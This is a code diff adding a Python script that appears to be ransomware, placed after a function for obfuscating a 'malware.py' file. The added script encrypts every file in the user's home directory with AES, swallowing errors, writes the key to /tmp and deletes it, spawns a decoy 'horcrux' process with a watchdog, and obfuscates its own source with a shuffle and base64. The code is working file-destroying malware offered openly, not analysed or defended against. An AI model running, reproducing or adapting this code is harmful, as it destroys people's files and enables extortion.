@@ -224,3 +224,89 @@ def obfuscate_code(input_file, output_file="obfuscated_payload.txt"):
 # Example usage
 # obfuscate_code("malware.py")
 
+### final 
+import os
+import base64
+import random
+import subprocess
+from pathlib import Path
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
+
+# --- Constants ---
+HOME_DIR = str(Path.home())
+KEY_FILE = "/tmp/horcrux"
+HORCRUX_PROC_NAME = "horcrux"
+OBFUSCATED_FILE = "/tmp/obfuscated_payload.txt"
+
+# --- Key Generation ---
+def generate_key():
+    key = get_random_bytes(16)  # AES-128 bit = 16 bytes
+    encoded_key = base64.b64encode(key).decode()
+    return key, encoded_key
+
+# --- AES Encryption ---
+def encrypt_file(filepath, key):
+    try:
+        with open(filepath, "rb") as f:
+            data = f.read()
+        cipher = AES.new(key, AES.MODE_EAX)
+        ciphertext, tag = cipher.encrypt_and_digest(data)
+        with open(filepath, "wb") as f:
+            f.write(cipher.nonce + tag + ciphertext)
+    except Exception as e:
+        pass  # Silently fail on protected/locked files
+
+# --- Encrypt Home Directory ---
+def encrypt_user_files(key):
+    for root, dirs, files in os.walk(HOME_DIR):
+        for name in files:
+            filepath = os.path.join(root, name)
+            encrypt_file(filepath, key)
+
+# --- Hide Key in RAM ---
+def hide_key(encoded_key):
+    with open(KEY_FILE, "w") as f:
+        f.write(encoded_key)
+    proc = subprocess.Popen(["sleep", "9999"], stdout=subprocess.DEVNULL)
+    print(f"[+] Key hidden in memory. PID: {proc.pid} (tagged as '{HORCRUX_PROC_NAME}')")
+    os.remove(KEY_FILE)
+    return proc.pid
+
+# --- Watchdog to Restore Key on Process Kill ---
+def monitor_horcrux(pid, encoded_key):
+    try:
+        while True:
+            os.kill(pid, 0)
+    except ProcessLookupError:
+        print("[!] Horcrux destroyed. Restoring key...")
+        with open(KEY_FILE, "w") as f:
+            f.write(encoded_key)
+
+# --- Obfuscate Script Itself ---
+def obfuscate_script():
+    with open(__file__, "r") as f:
+        code = f.read()
+
+    # Shuffle characters
+    chars = list(code)
+    indices = list(range(len(chars)))
+    random.shuffle(indices)
+    shuffled = ''.join(chars[i] for i in indices)
+
+    # Encode to base64 and store index map
+    b64_data = base64.b64encode(shuffled.encode()).decode()
+    with open(OBFUSCATED_FILE, "w") as f:
+        f.write(f"{b64_data}\n{','.join(map(str, indices))}")
+    print(f"[+] Obfuscated payload saved to {OBFUSCATED_FILE}")
+
+# --- Main Execution ---
+def main():
+    key, encoded_key = generate_key()
+    encrypt_user_files(key)
+    pid = hide_key(encoded_key)
+    obfuscate_script()
+    monitor_horcrux(pid, encoded_key)
+
+if __name__ == "__main__":
+    main()
